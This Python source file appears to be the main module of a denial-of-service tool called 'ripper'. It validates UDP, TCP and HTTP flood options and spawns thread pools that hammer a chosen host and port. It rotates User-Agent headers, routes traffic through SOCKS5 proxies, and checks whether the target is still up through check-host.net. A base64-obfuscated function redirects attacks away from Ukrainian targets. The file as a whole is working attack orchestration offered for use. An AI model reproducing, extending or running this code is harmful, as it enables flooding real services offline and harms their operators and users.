import datetime
import sys
import random
import time
from base64 import b64decode

from ripper import context, common, statistic, arg_parser
from ripper.attacks import *
from ripper.constants import *
from ripper.common import get_current_ip, format_dt, ns2s
from ripper.health_check import fetch_host_statuses
from ripper.proxy import Sock5Proxy

_ctx = Context()

###############################################
# Connection validators
###############################################
def validate_attack(_ctx: Context) -> bool:
    """Checks if attack is valid.
    Attack is valid if target accepted traffic within
    last SUCCESSFUL_CONNECTIONS_CHECK_PERIOD seconds (about 3 minutes)
    """
    if _ctx.attack_method == 'tcp':
        return check_successful_tcp_attack(_ctx)
    return check_successful_connections(_ctx)


def check_successful_connections(_ctx: Context) -> bool:
    """Checks if there are no successful connections more than SUCCESSFUL_CONNECTIONS_CHECK_PERIOD sec.
    Returns True if there was successful connection for last NO_SUCCESSFUL_CONNECTIONS_DIE_PERIOD_SEC sec.
    :parameter _ctx: Context
    """
    now_ns = time.time_ns()
    lower_bound = max(_ctx.get_start_time_ns(),
                      _ctx.Statistic.connect.last_check_time)
    diff_sec = ns2s(now_ns - lower_bound)

    if _ctx.Statistic.connect.success == _ctx.Statistic.connect.success_prev:
        if diff_sec > SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC:
            _ctx.add_error(Errors(ErrorCodes.ConnectionError.value, no_successful_connections_error_msg(_ctx)))
            return diff_sec <= NO_SUCCESSFUL_CONNECTIONS_DIE_PERIOD_SEC
    else:
        _ctx.Statistic.connect.last_check_time = now_ns
        _ctx.Statistic.connect.sync_success()
        _ctx.remove_error(ErrorCodes.ConnectionError.value)

    return True


def check_successful_tcp_attack(_ctx: Context) -> bool:
    """Checks if there are changes in sent bytes count.
    Returns True if there was successful connection for last NO_SUCCESSFUL_CONNECTIONS_DIE_PERIOD_SEC sec."""
    now_ns = time.time_ns()
    lower_bound = max(_ctx.get_start_time_ns(),
                      _ctx.Statistic.packets.connections_check_time)
    diff_sec = ns2s(now_ns - lower_bound)

    if _ctx.Statistic.packets.total_sent == _ctx.Statistic.packets.total_sent_prev:
        if diff_sec > SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC:
            _ctx.add_error(Errors(ErrorCodes.ConnectionError.value, no_successful_connections_error_msg(_ctx)))

            return diff_sec <= NO_SUCCESSFUL_CONNECTIONS_DIE_PERIOD_SEC
    else:
        _ctx.Statistic.packets.connections_check_time = now_ns
        _ctx.Statistic.packets.sync_packets_sent()
        _ctx.remove_error(ErrorCodes.ConnectionError.value)

    return True


###############################################
# Other
###############################################
def no_successful_connections_error_msg(_ctx: Context) -> str:
    if _ctx.proxy_manager.proxy_list_initial_len > 0:
        return NO_SUCCESSFUL_CONNECTIONS_ERROR_PROXY_MSG
    return NO_SUCCESSFUL_CONNECTIONS_ERROR_VPN_MSG


def generate_headers(_ctx: Context) -> dict[str, str]:
    headers = dict(_ctx.headers)
    headers['User-Agent'] = random.choice(_ctx.user_agents)
    return headers


def create_thread_pool(_ctx: Context) -> list[threading.Thread]:
    """Create Thread pool for selected attack method."""
    thread_pool = []
    for i in range(int(_ctx.threads)):
        if _ctx.attack_method == 'http':
            thread_pool.append(threading.Thread(target=down_it_http, args=[_ctx]))
        elif _ctx.attack_method == 'tcp':
            thread_pool.append(threading.Thread(target=down_it_tcp, args=[_ctx]))
        else:  # _ctx.attack_method == 'udp':
            thread_pool.append(threading.Thread(target=down_it_udp, args=[_ctx]))

        thread_pool[i].daemon = True  # if thread exists, it dies
        thread_pool[i].start()

    return thread_pool


def update_current_ip(_ctx: Context) -> None:
    """Updates current IPv4 address."""
    _ctx.Statistic.connect.set_state_in_progress()
    _ctx.IpInfo.my_current_ip = get_current_ip()
    _ctx.Statistic.connect.set_state_is_connected()
    if _ctx.IpInfo.my_start_ip is None:
        _ctx.IpInfo.my_start_ip = _ctx.IpInfo.my_current_ip


def update_host_statuses(_ctx: Context):
    """Updates host statuses based on check-host.net nodes"""
    diff = float('inf')
    if _ctx.last_host_statuses_update is not None:
        diff = time.time() - datetime.datetime.timestamp(_ctx.last_host_statuses_update)

    if _ctx.fetching_host_statuses_in_progress or diff < MIN_UPDATE_HOST_STATUSES_TIMEOUT:
        return
    _ctx.fetching_host_statuses_in_progress = True
    try:
        if _ctx.host_ip:
            host_statuses = fetch_host_statuses(_ctx)
            # API in some cases returns 403, so we can't update statuses
            if len(host_statuses.values()):
                _ctx.host_statuses = host_statuses
                _ctx.last_host_statuses_update = datetime.datetime.now()
    except:
        pass
    finally:
        _ctx.fetching_host_statuses_in_progress = False


def connect_host(_ctx: Context, proxy: Sock5Proxy = None) -> bool:
    _ctx.Statistic.connect.set_state_in_progress()
    try:
        sock = _ctx.sock_manager.create_tcp_socket(proxy)
        sock.connect((_ctx.host, _ctx.port))
    except:
        res = False
        _ctx.Statistic.connect.failed += 1
    else:
        res = True
        _ctx.Statistic.connect.success += 1
        sock.close()
    _ctx.Statistic.connect.set_state_is_connected()
    return res


def go_home(_ctx: Context) -> None:
    """Modifies host to match the rules"""
    home_code = b64decode('dWE=').decode('utf-8')
    if _ctx.host.endswith('.' + home_code.lower()) or common.get_country_by_ipv4(_ctx.host_ip) in home_code.upper():
        _ctx.host_ip = _ctx.host = 'localhost'
        _ctx.host += '*'


def validate_input(args) -> bool:
    """Validates input params."""
    if int(args.port) < 0:
        print(f'Wrong port number.')
        return False

    if int(args.threads) < 1:
        print(f'Wrong threads number.')
        return False

    if args.host is None or not args.host:
        print(f'Host wasn\'t detected')
        return False

    if args.attack_method.lower() not in ('udp', 'tcp', 'http'):
        print(f'Wrong attack type. Possible options: udp, tcp, http.')
        return False

    if args.http_method and args.http_method.lower() not in ('get', 'post', 'head', 'put', 'delete', 'trace', 'connect', 'options', 'patch'):
        print(f'Wrong http method type. Possible options: get, post, head, put, delete, trace, connect, options, patch.')
        return False

    if args.http_path and not args.http_path.startswith('/'):
        print(f'Http path should start with /.')
        return False

    return True


def connect_host_loop(_ctx: Context, retry_cnt: int = CONNECT_TO_HOST_MAX_RETRY, timeout_secs: int = 3) -> None:
    """Tries to connect host in permanent loop."""
    i = 0
    while i < retry_cnt:
        print(f'{format_dt(datetime.datetime.now())} ({i+1}/{retry_cnt}) Trying connect to {_ctx.host}:{_ctx.port}...')
        if connect_host(_ctx):
            break
        time.sleep(timeout_secs)
        i += 1


def main():
    """The main function to run the script from the command line."""
    args = arg_parser.create_parser().parse_args()

    if len(sys.argv) < 2 or not validate_input(args[0]):
        arg_parser.print_usage()

    # Init context
    context.init_context(_ctx, args)
    go_home(_ctx)
    # Proxies should be validated during the runtime
    connect_host_loop(_ctx, retry_cnt=(1 if _ctx.proxy_manager.proxy_list_initial_len > 0 else 5))
    _ctx.validate()

    time.sleep(.5)
    create_thread_pool(_ctx)

    statistic.render_statistic(_ctx)
